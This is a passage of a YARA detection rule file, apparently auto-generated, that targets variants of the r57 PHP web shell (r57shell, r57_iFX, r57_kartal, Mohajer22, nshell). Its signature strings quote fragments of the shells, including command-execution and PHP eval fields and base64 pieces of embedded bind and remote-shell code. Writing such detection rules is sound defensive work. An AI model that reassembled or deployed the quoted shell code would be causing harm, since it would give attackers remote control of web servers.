      $s13 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABAS" ascii
      $s14 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>\";" fullword ascii
      $s15 = "echo $fs.$table_up1.$lang[$language.'_text32'].$table_up2.$font;" fullword ascii
      $s16 = "\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</tr></ta" ascii
      $s17 = "echo \"<div align=center><textarea name=php_eval cols=100 rows=3>\";" fullword ascii
      $s18 = "echo $fs.$table_up1.$lang[$language.'_text76'].$table_up2.$ts;" fullword ascii
      $s19 = "echo $fs.$table_up1.$lang[$language.'_text35'].$table_up2.$ts;" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text33'].$table_up2.$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Predator_r57_r57shell_r57_iFX_r57_kartal_r57_Mohajer22_16 {
   meta:
      description = "php - from files Predator.txt, r57.txt, r57shell.txt, r57_iFX.txt, r57_kartal.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "1e12e85663c7eba9a0b28f6d73a7aecc4e88c36cffcfff9203f2f7f9e9a234f2"
      hash2 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash3 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash4 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" fullword ascii
      $s2 = "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" fullword ascii
      $s3 = "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" fullword ascii
      $s4 = "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2" fullword ascii
      $s5 = "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" fullword ascii
      $s6 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I" fullword ascii
      $s7 = "elseif(function_exists('shell_exec'))" fullword ascii
      $s8 = "if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . \" GB\";}" fullword ascii
      $s9 = "elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . \" MB\";}" fullword ascii
      $s10 = "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp" fullword ascii
      $s11 = "JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV" fullword ascii
      $s12 = "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt" fullword ascii
      $s13 = "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9" fullword ascii
      $s14 = "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" fullword ascii
      $s15 = "lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK" fullword ascii
      $s16 = "NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK" fullword ascii
      $s17 = "Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i" fullword ascii
      $s18 = "VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs" fullword ascii
      $s19 = "9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld" fullword ascii
      $s20 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _nshell_r57_r57shell_r57_iFX_r57_kartal_r57_Mohajer22_17 {
   meta:
      description = "php - from files nshell.txt, r57.txt, r57shell.txt, r57_iFX.txt, r57_kartal.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "1badfeb5dcf0dbf17d9daf39f6572db41e7a142a5322ccc81af3e6be00366a97"
      hash2 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash3 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash4 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii
      $s2 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii
      $s3 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii
      $s4 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii
      $s5 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii
      $s6 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii
      $s7 = "$group[\"execute\"] = ($mode & 00010) ? 'x' : '-';" fullword ascii
      $s8 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword ascii
      $s9 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword ascii
      $s10 = "$ora_on = @function_exists('ocilogon');" fullword ascii
      $s11 = "echo \"PostgreSQL: <b>\";" fullword ascii
      $s12 = "$curl_on = @function_exists('curl_version');" fullword ascii
      $s13 = "$group[\"read\"] = ($mode & 00040) ? 'r' : '-';" fullword ascii
      $s14 = "$world[\"read\"] = ($mode & 00004) ? 'r' : '-';" fullword ascii
      $s15 = "$owner[\"read\"] = ($mode & 00400) ? 'r' : '-';" fullword ascii
      $s16 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword ascii
      $s17 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword ascii
      $s18 = "$group[\"write\"] = ($mode & 00020) ? 'w' : '-';" fullword ascii
      $s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword ascii
      $s20 = "else if( $mode & 0x4000 ) { $type='d'; }" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbb3f ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_r57shell_r57_kartal_r57_Mohajer22_18 {
   meta:
      description = "php - from files r57.txt, r57shell.txt, r57_kartal.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s2 = "'eng_text1' =>'Executed command'," fullword ascii
      $s3 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',15,'irc.dalnet.ru'));" fullword ascii
      $s4 = "if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><" fullword ascii
      $s5 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc" fullword ascii
      $s6 = "'eng_butt1' =>'Execute'," fullword ascii
      $s7 = "echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font fac" fullword ascii
      $s8 = "echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face" fullword ascii
      $s9 = "echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></di" fullword ascii
      $s10 = "echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></" fullword ascii
      $s11 = "echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div" fullword ascii
      $s12 = "'eng_text3' =>'Run command'," fullword ascii
      $s13 = "bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';" fullword ascii
      $s14 = "$table_up3  = \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>\";" fullword ascii
      $s15 = "echo $font.$lang[$language.'_text1'].\": <b>\".$_POST['cmd'].\"</b></font></td></tr><tr><td><b><div align=center><textarea name=" ascii
      $s16 = "'eng_text11'=>'Password for access'," fullword ascii
      $s17 = "$table_up1  = \"<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: \";" fullword ascii
      $s18 = "'eng_text5' =>'Upload files on server'," fullword ascii
      $s19 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div " ascii
      $s20 = "if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div a" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57_r57shell_r57_iFX_r57_Mohajer22_19 {
   meta:
      description = "php - from files r57.txt, r57shell.txt, r57_iFX.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash3 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?tmp title=\\\"\".$lang[$language.'_text48'].\"\\\"><b>tmp</b></a> \".$rb;" fullword ascii
      $s2 = "/*  RST/GHC http://rst.void.ru , http://ghc.ru" fullword ascii
      $s3 = "/*  ANY MODIFIED REPUBLISHING IS RESTRICTED" fullword ascii
      $s4 = "if(isset($_GET['delete']))" fullword ascii
      $s5 = "/*                                ###   ##  ##########  ##   ###" fullword ascii
      $s6 = "/*  (c)oded by 1dt.w0lf" fullword ascii
      $s7 = "/*                                 ######## ########## #######" fullword ascii
      $s8 = "/*                                   ########################" fullword ascii
      $s9 = "/*                                   ###   ############   ###" fullword ascii
      $s10 = "/*                                 ###   ##  ########  ##   ###" fullword ascii
      $s11 = "/*                                        ##############" fullword ascii
      $s12 = "/*                                   ##   ##  ######  ##   ##" fullword ascii
      $s13 = "/*                                 ###   #  ##########  #   ###" fullword ascii
      $s14 = "/*                                   ##   #    ####   #    ##" fullword ascii
      $s15 = "/*                                    #    #          #    #" fullword ascii
      $s16 = "/*                                     ##                 ##" fullword ascii
      $s17 = "/*                                    #   ##   ####   ##   #" fullword ascii
      $s18 = "/*                                   ##   ##   ####   ##   ##" fullword ascii
      $s19 = "/*                                  ##    #   ######   #    ##" fullword ascii
      $s20 = "/*                                     #   #          #   #" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

